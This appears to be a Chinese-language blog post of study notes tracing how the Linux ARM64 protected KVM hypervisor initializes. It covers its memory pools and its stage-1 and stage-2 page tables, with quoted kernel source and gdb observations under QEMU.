<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kvm_arm_init</span><br><span class="line">    -&gt;init_hyp_mode</span><br><span class="line">        -&gt;kvm_hyp_init_protection</span><br><span class="line">            -&gt;do_pkvm_init</span><br><span class="line">                -&gt;  cpu_hyp_init_context();</span><br><span class="line">                    kvm_call_hyp_nvhe(__pkvm_init)</span><br><span class="line">module_init(kvm_arm_init);</span><br></pre></td></tr></table></figure>

<p>setup.c</p>
<p>kvm&#x2F;nvhe&#x2F;mem_protect.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__KVM_HOST_SMCCC_FUNC___pkvm_init handle___pkvm_init</span><br><span class="line">handle_host_hcall</span><br><span class="line">handle_host_hcall</span><br><span class="line">handle___pkvm_init</span><br><span class="line">__pkvm_init</span><br><span class="line">    divide_memory_pool</span><br><span class="line">        -&gt;hyp_pgt_base = hyp_early_alloc</span><br><span class="line">          host_s2_pgt_base = hyp_early_alloc</span><br><span class="line">    recreate_hyp_mappings</span><br><span class="line">        -&gt;kvm_pgtable_hyp_init(&amp;pkvm_pgtable);</span><br><span class="line">            -&gt;pgt-&gt;pgd = zalloc_page();</span><br><span class="line">          pkvm_create_mappings</span><br><span class="line">    update_nvhe_init_params</span><br><span class="line">    -&gt;&#123;for cpus</span><br><span class="line">        params-&gt;pgd_pa = __hyp_pa(pkvm_pgtable.pgd);</span><br><span class="line">    &#125;</span><br><span class="line">    __pkvm_init_switch_pgd</span><br><span class="line">        -&gt;msr ttbr0_el2, x4</span><br><span class="line">    __pkvm_init_finalise&#123;</span><br><span class="line">        kvm_host_prepare_stage2&#123;</span><br><span class="line">            __kvm_pgtable_stage2_init(&amp;host_mmu.pgt);</span><br><span class="line">                -&gt;pgt-&gt;pgd = mm_ops-&gt;zalloc_pages_exact(pgd_sz);</span><br><span class="line">            mmu-&gt;pgt = &amp;host_ammu.pgt;</span><br><span class="line">            mmu-&gt;pgd_phys = __hyp_pa(host_mmu.pgt.pgd);</span><br><span class="line">            atomic64_set(&amp;mmu-&gt;vmid.id, 0);</span><br><span class="line">        &#125;</span><br><span class="line">        fix_host_ownership();</span><br><span class="line">            -&gt;kvm_pgtable_walk(fix_host_ownership_wakler);</span><br><span class="line">                -&gt;host_stage2_set_owner_locked</span><br><span class="line">                    -&gt;host_stage2_try(kvm_pgtable_stage2_annotate, &amp;host_mmu.pgt);</span><br><span class="line">                        -&gt;kvm_pgtable_walk(pgt, stage2_map_walker);</span><br><span class="line">        __host_enter(host_ctxt);</span><br><span class="line">            -&gt;__host_enter_restore_full</span><br><span class="line">                -&gt;eret</span><br><span class="line">    &#125;</span><br><span class="line">    unreachable</span><br></pre></td></tr></table></figure>

<h4 id="hyp-memory"><a href="#hyp-memory" class="headerlink" title="hyp_memory"></a>hyp_memory</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kvm_hyp_reserve-&gt;</span><br><span class="line">register_memblock_regions&#123;</span><br><span class="line">    for_each_mem_region(reg) &#123;</span><br><span class="line">        hyp_memory[*hyp_memblock_nr_ptr] = *reg;</span><br><span class="line">        (*hyp_memblock_nr_ptr)++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort_memblock_regions</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include/linux/memblock.<span class="function">h</span></span><br><span class="line"><span class="function"><span class="title">for</span> <span class="params">(region = memblock.memory.regions; region &lt; memblock.memory.regions + memblock.memory.cnt ; region++)</span></span></span><br></pre></td></tr></table></figure>

<p>这里应该是直接复制了kernel自己的memory block</p>
<p>用gdb跑下来 结果是0x40000000 0x200000000 (8G) 和qemu有关 只有一个region</p>
<h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">bootmem_init</span><br><span class="line">    -&gt;kvm_hyp_reserve</span><br><span class="line">        -&gt;hyp_mem_base = memblock_phys_alloc</span><br><span class="line">        </span><br><span class="line">__pkvm_init</span><br><span class="line">    -&gt;divide_memory_pool</span><br><span class="line">        -&gt;hyp_early_alloc_init(hyp_mem_base)</span><br><span class="line">          host_s2_pgt_base = hyp_early_alloc</span><br><span class="line">       </span><br><span class="line">  </span><br><span class="line">  __pkvm_init_finalise</span><br><span class="line">      -&gt;kvm_host_prepare_stage2(host_s2_pgt_base)</span><br><span class="line">          -&gt;prepare_s2_pool(pgt_pool_base)</span><br><span class="line">              -&gt;pfn = hyp_virt_to_pfn(pgt_pool_base)</span><br><span class="line">                hyp_pool_init(&amp;host_s2_pool,pfn)</span><br><span class="line">                    -&gt;phys = hyp_pfn_to_phys(pfn)</span><br><span class="line">                      pool-&gt;range_start = phys</span><br><span class="line"></span><br><span class="line">__host_stage2_idmap</span><br><span class="line">    -&gt;kvm_pgtable_stage2_map(&amp;host_mmu.pgt, &amp;host_s2_pool)</span><br><span class="line">        -&gt;map_data.memcache = mc //host_s2_pool</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">stage2_map_walk_leaf</span><br><span class="line">    -&gt;childp = mm_ops-&gt;zalloc_page(data-&gt;memcache)</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"> prepare_s2_pool</span><br><span class="line">     -&gt;host_mmu.mm_ops = host_s2_zalloc_page</span><br><span class="line">                            -&gt;hyp_alloc_pages(pool)</span><br><span class="line"> kvm_guest_prepare_stage2</span><br><span class="line">     -&gt;vm-&gt;mm_ops = guest_s2_zalloc_page</span><br><span class="line">                     -&gt;hyp_alloc_pages(&amp;current_vm-&gt;pool)</span><br><span class="line"> __pkvm_init_finalise</span><br><span class="line">     -&gt;pkvm_pgtable_mm_ops = &amp;pkvm_pgtable_mm_ops</span><br><span class="line">         = hyp_zalloc_hyp_page</span><br><span class="line">             -&gt;hyp_alloc_pages(&amp;hpool) //static struct hyp_pool pool</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line"> //guest</span><br><span class="line"> kvm_guest_prepare_stage2</span><br><span class="line">     -&gt;hyp_pool_init(&amp;vm-&gt;pool)</span><br><span class="line"> //hyp</span><br><span class="line"> __pkvm_init_finalise</span><br><span class="line">     -&gt;hyp_pool_init(&amp;hpool)</span><br></pre></td></tr></table></figure>

<h4 id="页表配置"><a href="#页表配置" class="headerlink" title="页表配置"></a>页表配置</h4><p>Hyp stage1</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">bootmem_init<span class="comment">//arm64/mm/init.c</span></span><br><span class="line"><span class="function"><span class="type">void</span> __init <span class="title">kvm_hyp_reserve</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u64 hyp_mem_pages = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">is_hyp_mode_available</span>() || <span class="built_in">is_kernel_in_hyp_mode</span>())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">kvm_get_mode</span>() != KVM_MODE_PROTECTED)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">register_memblock_regions</span>();</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        *hyp_memblock_nr_ptr = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">kvm_err</span>(<span class="string">&quot;Failed to register hyp memblocks: %d\n&quot;</span>, ret);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hyp_mem_pages += <span class="built_in">hyp_s1_pgtable_pages</span>();</span><br><span class="line">    hyp_mem_pages += <span class="built_in">host_s2_pgtable_pages</span>();</span><br><span class="line">    hyp_mem_pages += <span class="built_in">hyp_vm_table_pages</span>();</span><br><span class="line">    hyp_mem_pages += <span class="built_in">hyp_vmemmap_pages</span>(STRUCT_HYP_PAGE_SIZE);</span><br><span class="line">    hyp_mem_pages += <span class="built_in">hyp_ffa_proxy_pages</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Try to allocate a PMD-aligned region to reduce TLB pressure once</span></span><br><span class="line"><span class="comment">     * this is unmapped from the host stage-2, and fallback to PAGE_SIZE.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    hyp_mem_size = hyp_mem_pages &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    hyp_mem_base = <span class="built_in">memblock_phys_alloc</span>(<span class="built_in">ALIGN</span>(hyp_mem_size, PMD_SIZE),</span><br><span class="line">                       PMD_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!hyp_mem_base)</span><br><span class="line">        hyp_mem_base = <span class="built_in">memblock_phys_alloc</span>(hyp_mem_size, PAGE_SIZE);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        hyp_mem_size = <span class="built_in">ALIGN</span>(hyp_mem_size, PMD_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hyp_mem_base) &#123;</span><br><span class="line">        <span class="built_in">kvm_err</span>(<span class="string">&quot;Failed to reserve hyp memory\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">kvm_info</span>(<span class="string">&quot;Reserved %lld MiB at 0x%llx\n&quot;</span>, hyp_mem_size &gt;&gt; <span class="number">20</span>,</span><br><span class="line">         hyp_mem_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__pkvm_init(hyp_mem_base,hyp_mem_size)</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">recreate_hyp_mappings</span><span class="params">(<span class="type">phys_addr_t</span> phys, <span class="type">unsigned</span> <span class="type">long</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="type">unsigned</span> <span class="type">long</span> *per_cpu_base,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 u32 hyp_va_bits)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">void</span> *start, *end, *virt = <span class="built_in">hyp_phys_to_virt</span>(phys);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> pgt_size = <span class="built_in">hyp_s1_pgtable_pages</span>() &lt;&lt; PAGE_SHIFT;</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">kvm_pgtable_prot</span> prot;</span><br><span class="line">        <span class="type">int</span> ret, i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Recreate the hyp page-table using the early page allocator */</span></span><br><span class="line">        <span class="built_in">hyp_early_alloc_init</span>(hyp_pgt_base, pgt_size);</span><br><span class="line">        ret = <span class="built_in">kvm_pgtable_hyp_init</span>(&amp;pkvm_pgtable, hyp_va_bits,</span><br><span class="line">                                   &amp;hyp_early_alloc_mm_ops);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">hyp_create_idmap</span>(hyp_va_bits);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">hyp_map_vectors</span>();</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">hyp_back_vmemmap</span>(<span class="built_in">hyp_virt_to_phys</span>(vmemmap_base));</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">pkvm_create_mappings</span>(__hyp_text_start, __hyp_text_end, PAGE_HYP_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">pkvm_create_mappings</span>(__hyp_data_start, __hyp_data_end, PAGE_HYP);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">pkvm_create_mappings</span>(__hyp_rodata_start, __hyp_rodata_end, PAGE_HYP_RO);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">pkvm_create_mappings</span>(__hyp_bss_start, __hyp_bss_end, PAGE_HYP);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">pkvm_create_mappings</span>(virt, virt + size, PAGE_HYP);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; hyp_nr_cpus; i++) &#123;</span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">kvm_nvhe_init_params</span> *params = <span class="built_in">per_cpu_ptr</span>(&amp;kvm_init_params, i);</span><br><span class="line"></span><br><span class="line">                start = (<span class="type">void</span> *)<span class="built_in">kern_hyp_va</span>(per_cpu_base[i]);</span><br><span class="line">                end = start + <span class="built_in">PAGE_ALIGN</span>(hyp_percpu_size);</span><br><span class="line">                ret = <span class="built_in">pkvm_create_mappings</span>(start, end, PAGE_HYP);</span><br><span class="line">                <span class="keyword">if</span> (ret)</span><br><span class="line">                        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">                ret = <span class="built_in">pkvm_create_stack</span>(params-&gt;stack_pa, &amp;params-&gt;stack_hyp_va);</span><br><span class="line">                <span class="keyword">if</span> (ret)</span><br><span class="line">                        <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">create_hyp_host_fp_mappings</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Map the host sections RO in the hypervisor, but transfer the</span></span><br><span class="line"><span class="comment">         * ownership from the host to the hypervisor itself to make sure they</span></span><br><span class="line"><span class="comment">         * can&#x27;t be donated or shared with another entity.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * The ownership transition requires matching changes in the host</span></span><br><span class="line"><span class="comment">         * stage-2. This will be done later (see finalize_host_mappings()) once</span></span><br><span class="line"><span class="comment">         * the hyp_vmemmap is addressable.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        prot = <span class="built_in">pkvm_mkstate</span>(PAGE_HYP_RO, PKVM_PAGE_SHARED_OWNED);</span><br><span class="line">        ret = <span class="built_in">pkvm_create_mappings</span>(&amp;kvm_vgic_global_state,</span><br><span class="line">                                   &amp;kvm_vgic_global_state + <span class="number">1</span>, prot);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        start = <span class="built_in">hyp_phys_to_virt</span>(pvmfw_base);</span><br><span class="line">        end = start + pvmfw_size;</span><br><span class="line">        prot = <span class="built_in">pkvm_mkstate</span>(PAGE_HYP_RO, PKVM_PAGE_OWNED);</span><br><span class="line">        ret = <span class="built_in">pkvm_create_mappings</span>(start, end, prot);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认是OWNED 0</p>
<p>映射hyp自己的代码 和一个需要和host共享的</p>
<p>Host stage2</p>
<p>Walk hyp的stage1去对应配host的stage2</p>
<p>其中存在在hyp stage1的都标记为hyp 这样之后就不会map </p>
<p>share的立即补上map （很少）</p>
<p>原来是return kvm_pgtable_walk(&amp;pkvm_pgtable, 0, BIT(pkvm_pgtable.ia_bits), &amp;walker); 遍历全部地址范围</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">fix_host_ownership</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kvm_pgtable_walker</span> walker = &#123;</span><br><span class="line">        .cb = fix_host_ownership_walker,</span><br><span class="line">        .flags  = KVM_PGTABLE_WALK_LEAF,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> i, ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; hyp_memblock_nr; i++) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">memblock_region</span> *reg = &amp;hyp_memory[i];</span><br><span class="line">        u64 start = (u64)<span class="built_in">hyp_phys_to_virt</span>(reg-&gt;base);</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">kvm_pgtable_walk</span>(&amp;pkvm_pgtable, start, reg-&gt;size, &amp;walker);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">fix_host_ownership_walker</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">enum</span> kvm_pgtable_walk_flags visit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">kvm_pgtable_prot</span> prot;</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">pkvm_page_state</span> state;</span><br><span class="line">        <span class="type">phys_addr_t</span> phys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">kvm_pte_valid</span>(ctx-&gt;old))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ctx-&gt;level != (KVM_PGTABLE_MAX_LEVELS - <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">        phys = <span class="built_in">kvm_pte_to_phys</span>(ctx-&gt;old);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">addr_is_memory</span>(phys))</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Adjust the host stage-2 mappings to match the ownership attributes</span></span><br><span class="line"><span class="comment">         * configured in the hypervisor stage-1.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        state = <span class="built_in">pkvm_getstate</span>(<span class="built_in">kvm_pgtable_hyp_pte_prot</span>(ctx-&gt;old));</span><br><span class="line">        <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">        <span class="keyword">case</span> PKVM_PAGE_OWNED:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">host_stage2_set_owner_locked</span>(phys, PAGE_SIZE, PKVM_ID_HYP);</span><br><span class="line">        <span class="keyword">case</span> PKVM_PAGE_SHARED_OWNED:</span><br><span class="line">                prot = <span class="built_in">pkvm_mkstate</span>(PKVM_HOST_MEM_PROT, PKVM_PAGE_SHARED_BORROWED);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PKVM_PAGE_SHARED_BORROWED:</span><br><span class="line">                prot = <span class="built_in">pkvm_mkstate</span>(PKVM_HOST_MEM_PROT, PKVM_PAGE_SHARED_OWNED);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">host_stage2_idmap_locked</span>(phys, PAGE_SIZE, prot);</span><br><span class="line">            -&gt;<span class="built_in">kvm_pgtable_stage2_map</span>(&amp;host_mmu.pgt)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遍历的pt是pkvm_pgtable 就是hyp stage1 地址范围是kernel启动时所有memblock的地址范围</p>
<p>PAGE_OWNED表示hyp独有 因此从host stage2中移除</p>
<p>这里hyp stage1空洞的部分 host stage2是不做处理的</p>
<p>不做处理默认是属于host的 因此handle mem abort的时候会直接补上</p>
<p>gdb跑下来的结论：</p>
<ol>
<li>fix_host_ownership中host_stage2_idmap_locked确实只执行了一次 </li>
<li>正常启动以后stage2是在host上启用了的</li>
<li>host_stage2_idmap_locked会执行很多次 且每次size不是4096 应该是host pf进来的</li>
</ol>
<p>这里只是保存了通用寄存器然后eret 理论上应该返回到hvc之前的一句 即kvm_call_hyp_nvhe(__pkvm_init)之后</p>
<p>结束初始化后直接打开了host stage2翻译</p>
<p>arch&#x2F;arm64&#x2F;kvm&#x2F;hyp&#x2F;nvhe&#x2F;pkvm.c</p>
<p>arm64&#x2F;kvm&#x2F;pkvm.c</p>
<p>kvm_call_hyp_nvhe -&gt; arm_smccc_1_1_hvc 执行SMCCC_HVC_INST -&gt; hvc #0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">finalize_pkvm</span><br><span class="line">    -&gt;pkvm_drop_host_privileges</span><br><span class="line">        -&gt;on_each_cpu(_kvm_host_prot_finalize);</span><br><span class="line">            -&gt;kvm_call_hyp_nvhe(__pkvm_prot_finalize);</span><br><span class="line">                -&gt;  hcr_el2 |= HCR_VM;</span><br><span class="line">                    __load_stage2(&amp;host_mmu.arch.mmu,&amp;host_mmu.arch);</span><br><span class="line">device_initcall_sync(finalize_pkvm);</span><br></pre></td></tr></table></figure>

<p>finalize_pkvm用device_initcall_sync调用 调用链不清晰，kvm_arm_init-&gt;__pkvm_init 完成了所有的host stage2页表初始工作</p>
<h3 id="Page-fault"><a href="#Page-fault" class="headerlink" title="Page fault"></a>Page fault</h3><p>kvm&#x2F;mmu.c</p>
